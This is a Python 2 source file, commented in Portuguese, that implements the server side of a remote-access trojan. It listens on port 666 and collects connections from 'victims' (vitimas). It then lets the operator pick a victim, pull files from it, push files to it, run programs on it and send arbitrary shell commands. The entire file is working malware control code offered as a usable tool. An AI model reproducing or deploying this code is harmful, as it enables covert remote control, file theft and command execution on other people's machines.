import socket, threading, os, base64

conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexao.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #1
conexao.bind(("0.0.0.0",666))
conexao.listen(1) #2

class Vitima: #3
    def __init__(self, nome, sock):
        self.nome = nome
        self.sock = sock

def aceita_conexao(): #4
    while True:
        sock, endereco  = conexao.accept() #5
        nome = sock.recv(1024) #6
        vitima = Vitima(nome,sock) #7
        vitimas.append(vitima) #8

threading.Thread(target=aceita_conexao).start()
vitimas = [] #9

while True: #10
    try: #11
        comando = raw_input("SHELL> ")

        if comando == "": #12
            pass

        elif comando == "vitimas": #13
            print "\nID\tNOME"
            for x,y in enumerate(vitimas): #14
                print x, "\t", y.nome, "\n"

        elif comando.startswith("vitima"): #15
            try: #16
                vitima = abs( int(comando.split()[1]) ) #17
                if vitima > len(vitimas)-1: #18
                    print "ID invalido"
                    del vitima #19
            except (IndexError, ValueError): #20
                print "Selecione a vitima pelo seu ID"

        elif comando.startswith("download"):
            try: #21
                nome_do_arquivo = comando.split()[1] #22
                resultado = "" #23
                downloaded = True #24
                print "Aguarde ate que o download seja completado..."
                vitimas[vitima].sock.send("download %s" %nome_do_arquivo) #25
                while True: #26
                    resultado2 = vitimas[vitima].sock.recv(1024) #27
                    resultado += resultado2 #28
                    if not resultado2: #29
                        raise socket.error #30
                    elif "\\" in resultado2: #31
                        print "Arquivo nao encontrado (Download cancelado)"
                        downloaded = False
                        break
                    elif "\n" in resultado2: #32
                        break
                if downloaded: #33
                    with open(os.path.basename(nome_do_arquivo), "wb") as arquivo: #34
                        conteudo = base64.b64decode(resultado)
                        arquivo.write(conteudo)
                    print "\nDownload concluido"
            except IndexError: #35
                print "Uso: download arquivo_remoto"

        elif comando.startswith("upload"):
            try: #36
                arquivo_local = comando.split()[1] #37
                arquivo_remoto = comando.split()[2] #38
                with open(arquivo_local, "rb") as arquivo:
                    arquivo2 = arquivo.read() #39
                vitimas[vitima].sock.send("upload %s" %arquivo_remoto) #40
                print "Aguarde ate que o upload seja completado..."
                vitimas[vitima].sock.sendall(base64.b64encode(arquivo2) + "\n") #41
                resposta = vitimas[vitima].sock.recv(26) #42
                if "\r" in resposta: #43
                    print vitimas[vitima].sock.recv(26) #44
                else: #45
                    print resposta
            except IndexError: #46
                print "Uso: upload arquivo_local arquivo_remoto"
            except IOError: #47
                print "Arquivo local nao encontrado ou a vitima desconectou"

        elif comando.startswith("exec"):
            try: #48
                cmd = comando.split()[1:] #49
                if len(cmd) == 0: #50
                    raise IndexError #51
                vitimas[vitima].sock.send(comando) #52
            except IndexError: #53
                print "Uso: exec arquivo (parametros)"
                print "Exemplo: exec sshd.exe -d"
            else: #54
                resultado = vitimas[vitima].sock.recv(28) #55
                if not resultado: #56
                    raise socket.error #57
                elif "\r" in resultado: #58
                    print vitimas[vitima].sock.recv(28) #59
                else: #60
                    print resultado

        else: #61
            vitimas[vitima].sock.send(comando) #62
            resultado = "" #63
            while True:
                # Caso seja executado notepad.exe, cmd.exe
                # ou powershell.exe o servidor ficara aguardando
                # por 1024 bytes de resposta do cliente
                # Sera necessario encerrar o notepad na vitima
                # para que o servidor "descongele"
                #
                # Para executar um arquivo, use o modulo exec
                resultado2 = vitimas[vitima].sock.recv(1024) #64
                resultado += resultado2
                if not resultado2: #65
                    raise socket.error
                elif resultado2[-1] == "\n": #66
                    break
            print base64.b64decode(resultado)

    except NameError: #67
        print "Vitima nao definida"

    except socket.error: #68
        print "Vitima invalida, selecione outra"
        vitimas[vitima].sock.close()
        del vitimas[vitima]
        del vitima

    except KeyboardInterrupt: #69
        print "Ctrl+c pressionado, excluindo vitima atual"
        try: #70
            vitimas[vitima].sock.close()
            del vitimas[vitima]
            del vitima
        except NameError: #71
            pass